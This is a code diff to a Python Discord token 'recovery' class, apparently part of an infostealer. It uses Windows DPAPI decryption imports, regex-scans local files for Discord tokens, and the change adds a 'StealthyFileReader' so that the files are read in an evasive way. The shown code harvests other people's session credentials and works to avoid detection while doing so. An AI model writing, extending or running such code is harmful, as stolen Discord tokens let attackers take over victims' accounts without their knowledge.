@@ -11,6 +11,9 @@ import win32crypt
 from win32crypt import CryptUnprotectData
 import requests
 from Utilities.DataSaver import DataSaverUtility
+
+from Utilities.StealthReader import StealthyFileReader
+
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 logging.basicConfig(level=logging.INFO, format="%(message)s")
@@ -74,11 +77,20 @@ class DiscordTokenRecovery:
 
         for file_path in file_paths:
             try:
-                with open(file_path, "rb") as file:
-                    content = file.read()
-                    potential_tokens = token_pattern_1.findall(content)
-                    for pt in potential_tokens:
-                        tokens.add(pt.decode(errors='ignore'))  # Add to the set to ensure uniqueness
+
+                # Check if the file is empty and skip if it is
+                if os.path.getsize(file_path) == 0:
+                    logging.warning(f"Skipping empty file: {file_path}")
+                    continue
+
+                reader = StealthyFileReader(file_path)
+                content = reader.read()
+                print(f"Reading {file_path} using: {reader.method_used}")
+
+                potential_tokens = token_pattern_1.findall(content)
+                for pt in potential_tokens:
+                    tokens.add(pt.decode(errors='ignore'))  # Add to the set to ensure uniqueness
+
 
                 # Using the new patterns
                 content_str = content.decode(errors='ignore')
